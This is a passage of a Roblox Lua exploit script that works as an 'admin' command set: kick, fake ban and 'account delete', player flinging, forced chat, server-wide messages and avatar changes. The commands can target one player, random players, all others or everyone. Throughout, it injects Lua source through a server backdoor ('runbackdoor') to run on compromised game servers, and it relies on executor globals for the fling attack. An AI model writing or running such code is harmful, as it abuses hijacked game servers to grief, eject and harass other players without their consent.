	local players = game:GetService("Players"):GetPlayers()

	local function noiceicebaby(player)
		local character = player.Character
		if character then
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart then
				humanoidRootPart.Anchored = false
				local humanoid = character:FindFirstChild("Humanoid")
				if humanoid then
					humanoid.PlatformStand = false
				end
			end
		end
	end

	local function hotttttt(bckd)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					noiceicebaby(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					noiceicebaby(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						noiceicebaby(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					noiceicebaby(player)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						noiceicebaby(player)
						break
					end
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = false
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = false
							end
						end
					end
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local character = v.Character
						if character then
							local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
							if humanoidRootPart then
								humanoidRootPart.Anchored = false
								local humanoid = character:FindFirstChild("Humanoid")
								if humanoid then
									humanoid.PlatformStand = false
								end
							end
						end
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = false
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = false
							end
						end
					end
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = false
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = false
							end
						end
					end
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local character = v.Character
							if character then
								local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
								if humanoidRootPart then
									humanoidRootPart.Anchored = false
									local humanoid = character:FindFirstChild("Humanoid")
									if humanoid then
										humanoid.PlatformStand = false
									end
								end
							end
						end
					end
				]], player.Name)
				break
			end
		end
	end

	hotttttt(bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

function fakekick(player, reason)
	if not reason then reason = "kicked :<" end
	if player and player:IsA("Player") then
		if player.Character then
			player.Character:Destroy()
			player.Parent = nil
		end
		if reason then
			player:Kick(reason)
		else
			player:Kick()
		end
	end
end

addcommand("kick", "kick", function(target, reason)
	local players = game:GetService("Players"):GetPlayers()

	local function getout(bckd, kickReason)
		if backdoor ~= nil then
			local updatedScript = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			updatedScript = string.gsub(updatedScript, "%%reason%%", kickReason or "kicked :<")
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					fakekick(localPlayer, kickReason)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					fakekick(randomPlayer, kickReason)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						fakekick(player, kickReason)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					fakekick(player, kickReason)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						fakekick(player, kickReason)
						break
					end
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v:Kick("]] .. (reason or "kicked :<") .. [[")
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v:Kick("%s")
					end
				end
			]], randomPlayer.Name, reason or "kicked :<")
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v:Kick("]] .. (reason or "kicked :<") .. [[")
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v:Kick("]] .. (reason or "kicked :<") .. [[")
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v:Kick("%s")
						end
					end
				]], player.Name, reason or "kicked :<")
				break
			end
		end
	end

	getout(bckd, reason)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("ban", "ban", function(target, reason)
	local players = game:GetService("Players"):GetPlayers()

	local function getout(bckd, kickReason)
		if backdoor ~= nil then
			local updatedScript = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			updatedScript = string.gsub(updatedScript, "%%reason%%", kickReason or "banned :<")
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					fakekick(localPlayer, kickReason)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					fakekick(randomPlayer, kickReason)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						fakekick(player, kickReason)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					fakekick(player, kickReason)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						fakekick(player, kickReason)
						break
					end
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v:Kick("]] .. (reason or "banned :<") .. [[")
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v:Kick("%s")
					end
				end
			]], randomPlayer.Name, reason or "banned :<")
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v:Kick("]] .. (reason or "banned :<") .. [[")
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v:Kick("]] .. (reason or "banned :<") .. [[")
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v:Kick("%s")
						end
					end
				]], player.Name, reason or "banned :<")
				break
			end
		end
	end

	getout(bckd, reason)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("accountdelete", "terminate", function(target, reason)
	local players = game:GetService("Players"):GetPlayers()

	local function getout(bckd, kickReason)
		if backdoor ~= nil then
			local updatedScript = string.gsub(bckd, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			updatedScript = string.gsub(updatedScript, "%%reason%%", kickReason or "what have you done")
			runbackdoor(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					fakekick(localPlayer, kickReason)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					fakekick(randomPlayer, kickReason)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						fakekick(player, kickReason)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					fakekick(player, kickReason)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						fakekick(player, kickReason)
						break
					end
				end
			end
		end
	end

	local bckd
	if not target or target == "" or target == "me" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v:Kick("]] .. (reason or "what have you done") .. [[")
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			bckd = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v:Kick("%s")
					end
				end
			]], randomPlayer.Name, reason or "what have you done")
		end
	elseif target == "others" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v:Kick("]] .. (reason or "what have you done") .. [[")
				end
			end
		]]
	elseif target == "all" then
		bckd = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v:Kick("]] .. (reason or "what have you done") .. [[")
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				bckd = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v:Kick("%s")
						end
					end
				]], player.Name, reason or "what have you done")
				break
			end
		end
	end

	getout(bckd, reason)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("bodyfling", "bfling", function(target)
	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer

	local Targets = {target}
	local AllBool = false

	local function GetPlayer(Name)
		Name = Name:lower()
		if Name == "all" then
			AllBool = true
			return nil
		elseif Name == "random" then
			local GetPlayers = Players:GetPlayers()
			if table.find(GetPlayers, localPlayer) then 
				table.remove(GetPlayers, table.find(GetPlayers, localPlayer)) 
			end
			return GetPlayers[math.random(#GetPlayers)]
		else
			for _, x in ipairs(Players:GetPlayers()) do
				if x ~= localPlayer and x.Name:lower():match("^" .. Name) then
					return x
				end
			end
		end
		return nil
	end

	local function SkidFling(TargetPlayer)
		if not TargetPlayer or not TargetPlayer.Character then return end

		local Character = localPlayer.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		local RootPart = Humanoid and Humanoid.RootPart

		local TCharacter = TargetPlayer.Character
		local THumanoid = TCharacter and TCharacter:FindFirstChildOfClass("Humanoid")
		local TRootPart = THumanoid and THumanoid.RootPart
		local THead = TCharacter and TCharacter:FindFirstChild("Head")
		local Accessory = TCharacter and TCharacter:FindFirstChildOfClass("Accessory")
		local Handle = Accessory and Accessory:FindFirstChild("Handle")

		if not Character or not Humanoid or not RootPart then return end

		if RootPart.Velocity.Magnitude < 50 then
			getgenv().OldPos = RootPart.CFrame
		end

		if THead then
			workspace.CurrentCamera.CameraSubject = THead
		elseif Handle then
			workspace.CurrentCamera.CameraSubject = Handle
		elseif THumanoid and TRootPart then
			workspace.CurrentCamera.CameraSubject = THumanoid
		end

		local function FPos(BasePart, Pos, Ang)
			RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
			Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
			RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
			RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
		end

		local function SFBasePart(BasePart)
			local TimeToWait = 2
			local StartTime = tick()
			local Angle = 0

			repeat
				if RootPart and THumanoid then
					Angle = Angle + 100
					FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
					task.wait()
				else
					break
				end
			until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > StartTime + TimeToWait
		end

		local BV = Instance.new("BodyVelocity")
		BV.Name = "EpixVel"
		BV.Parent = RootPart
		BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
		BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

		if TRootPart then
			SFBasePart(TRootPart)
		elseif THead then
			SFBasePart(THead)
		elseif Handle then
			SFBasePart(Handle)
		end

		BV:Destroy()
		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		workspace.CurrentCamera.CameraSubject = Humanoid

		repeat
			RootPart.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
			Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
			Humanoid:ChangeState("GettingUp")
			for _, x in ipairs(Character:GetChildren()) do
				if x:IsA("BasePart") then
					x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
				end
			end
			task.wait()
		until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
	end

	local TargetPlayer = GetPlayer(target)

	if AllBool then
		for _, x in ipairs(Players:GetPlayers()) do
			if x ~= localPlayer then
				SkidFling(x)
			end
		end
	elseif TargetPlayer then
		SkidFling(TargetPlayer)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("message", "message", function(...)
	text = table.concat({...}, " ")

	local function messag(targetText)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub([[
                local message = Instance.new("Message")
                message.Text = "%message%"
		message.Name = "dontdeleteme"
                message.Parent = game:GetService("Workspace")
            ]], "%%message%%", targetText)
			runbackdoor(backdoor, updatedScript)
		else
			if targetText and targetText ~= "" then
				local message = Instance.new("Message")
				message.Text = targetText
				message.Parent = game:GetService("Workspace")
				message.Name "dontdeleteme"
			end
		end
	end

	messag(text)
end)

addcommand("closemessages", "nomsgs", function()
	local function nomessag()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Message") then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Message") then
					obj:Destroy()
				end
			end
		end
	end

	nomessag()
end)

addcommand("closeunlabeledmessages", "noulmsgs", function()
	local function nomessag()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Message") and obj.Name ~= "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Message") and obj.Name ~= "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	nomessag()
end)

addcommand("closelabeledmessages", "nolmsgs", function()
	local function nomessag()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Message") and obj.Name == "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Message") and obj.Name == "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	nomessag()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("hint", "hint", function(...)
	text = table.concat({...}, " ")

	local function hitn(targetText)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub([[
                local message = Instance.new("Hint")
                message.Text = "%message%"
		message.Name = "dontdeleteme"
                message.Parent = game:GetService("Workspace")
            ]], "%%message%%", targetText)
			runbackdoor(backdoor, updatedScript)
		else
			if targetText and targetText ~= "" then
				local message = Instance.new("Hint")
				message.Text = targetText
				message.Parent = game:GetService("Workspace")
				message.Name = "dontdeleteme"
			end
		end
	end

	hitn(text)
end)

addcommand("closehints", "nohints", function()
	local function nohitn()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Hint") then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Hint") then
					obj:Destroy()
				end
			end
		end
	end

	nohitn()
end)

addcommand("closeunlabeledhints", "noulhints", function()
	local function nohitn()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Hint") and obj.Name ~= "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Hint") and obj.Name ~= "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	nohitn()
end)

addcommand("closelabeledhints", "nolhints", function()
	local function nohitn()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Hint") and obj.Name == "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runbackdoor(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Hint") and obj.Name == "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	nohitn()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("chat", "talk", function(target, ...)
	text = table.concat({...}, " ")
	local ChatService = game:GetService("Chat")
	local Players = game:GetService("Players")

	local function bubl(player)
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end

	if not backdoor then
		local targets = {}

		if not target or target == "" or target == "me" then
			table.insert(targets, Players.LocalPlayer)
		elseif target == "random" then
			local all = Players:GetPlayers()
			if #all > 0 then
				table.insert(targets, all[math.random(1, #all)])
			end
		elseif target == "others" then
			for _, p in ipairs(Players:GetPlayers()) do
				if p ~= Players.LocalPlayer then
					table.insert(targets, p)
				end
			end
		elseif target == "all" then
			targets = Players:GetPlayers()
		else
			for _, p in ipairs(Players:GetPlayers()) do
				if string.find(string.lower(p.Name), string.lower(target)) then
					table.insert(targets, p)
				end
			end
		end

		for _, p in ipairs(targets) do
			bubl(p)
		end
	else
		local bckd = nil
		local esctxt = text:gsub("\\", "\\\\"):gsub('"', '\\"')

		if target == "me" then
			bckd = string.format([[
				local p = game:GetService("Players"):FindFirstChild("%%username%%")
				if p and p.Character and p.Character:FindFirstChild("Head") then
					game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
				end
			]], esctxt)
		elseif target == "random" then
			bckd = string.format([[
				local plrs = game:GetService("Players"):GetPlayers()
				if #plrs > 0 then
					local p = plrs[math.random(1, #plrs)]
					if p.Character and p.Character:FindFirstChild("Head") then
						game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
					end
				end
			]], esctxt)
		elseif target == "others" then
			bckd = string.format([[
				for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
					if p.Name ~= "%%username%%" and p.Character and p.Character:FindFirstChild("Head") then
						game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
					end
				end
			]], esctxt)
		elseif target == "all" then
			bckd = string.format([[
				for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
					if p.Character and p.Character:FindFirstChild("Head") then
						game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
					end
				end
			]], esctxt)
		else
			local matchedNames = {}
			for _, p in ipairs(Players:GetPlayers()) do
				if string.find(string.lower(p.Name), string.lower(target)) then
					table.insert(matchedNames, string.format('"%s"', p.Name))
				end
			end

			if #matchedNames > 0 then
				bckd = string.format([[
					local names = {%s}
					for _, name in ipairs(names) do
						local p = game:GetService("Players"):FindFirstChild(name)
						if p and p.Character and p.Character:FindFirstChild("Head") then
							game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
						end
					end
				]], table.concat(matchedNames, ", "), esctxt)
			end
		end

		if bckd then
			bckd = bckd:gsub("%%username%%", Players.LocalPlayer.Name)
			runbackdoor(backdoor, bckd)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("disco", "disco", function()
	if not isDiscoActive then
		savelighting()
		isDiscoActive = true
		task.spawn(startDiscoMode)
	end
end)

addcommand("undisco", "undisco", function()
	if isDiscoActive then
		isDiscoActive = false
	end
	loadlghting()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("chickenarms", "carms", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game:GetService("Players").LocalPlayer

	local function tposelol(player)
		local character = player.Character
		if character and character:FindFirstChild("Torso") then
			local torso = character.Torso
			if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
				local leftShoulder = torso["Left Shoulder"]
				local rightShoulder = torso["Right Shoulder"]

				leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
					* CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
					* CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
					* CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
				leftShoulder.C1 = CFrame.new(0, 0.5, 0)

				rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
					* CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
					* CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
					* CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
				rightShoulder.C1 = CFrame.new(0, 0.5, 0)
			end
		end
	end

	local function carmm(targetplr)
		local bckd = ""

		if not target or target == "" or target == "me" then
			bckd = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name == "%s" then
                        local character = v.Character
                        if character then
                            local torso = character.Torso
                            if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                local leftShoulder = torso["Left Shoulder"]
                                local rightShoulder = torso["Right Shoulder"]

                                leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                            end
                        end
                    end
                end
            ]], targetplr.Name)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			if randomPlayer then
				bckd = string.format([[
                    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                        if v:IsA("Player") and v.Name == "%s" then
                            local character = v.Character
                            if character then
                                local torso = character.Torso
                                if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                    local leftShoulder = torso["Left Shoulder"]
                                    local rightShoulder = torso["Right Shoulder"]

                                    leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                        * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                    leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                    rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                        * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                    rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                                end
                            end
                        end
                    end
                ]], randomPlayer.Name)
			end
		elseif target == "others" then
			bckd = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name ~= "%s" then
                        local character = v.Character
                        if character then
                            local torso = character.Torso
                            if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                local leftShoulder = torso["Left Shoulder"]
                                local rightShoulder = torso["Right Shoulder"]

                                leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                            end
                        end
                    end
                end
            ]], targetplr.Name)
		elseif target == "all" then
			bckd = [[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") then
                        local character = v.Character
                        if character then
                            local torso = character.Torso
                            if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                local leftShoulder = torso["Left Shoulder"]
                                local rightShoulder = torso["Right Shoulder"]

                                leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                            if v:IsA("Player") and v.Name == "%s" then
                                local character = v.Character
                                if character then
                                    local torso = character.Torso
                                    if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                        local leftShoulder = torso["Left Shoulder"]
                                        local rightShoulder = torso["Right Shoulder"]

                                        leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                            * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                        leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                        rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                            * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                        rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                                    end
                                end
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if backdoor then
			runbackdoor(backdoor, bckd)
		else
			tposelol(targetplr)
		end
	end

	carmm(localPlayer)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("discoavatar", "davi", function(target)
	local presets = {"Bright red", "Bright yellow", "Bright orange", "Bright violet", "Bright blue", "Bright bluish green", "Bright green"}

	local function discoava(player)
		if player and player.Character then
			task.spawn(function()
				while true do
					task.wait(0.5)
					local characterParts = player.Character:GetChildren()
					for _, part in ipairs(characterParts) do
						if part:IsA("BasePart") then
							part.BrickColor = BrickColor.new(presets[math.random(1, #presets)])
						end
					end
				end
			end)
		end
	end

	local players = game:GetService("Players"):GetPlayers()

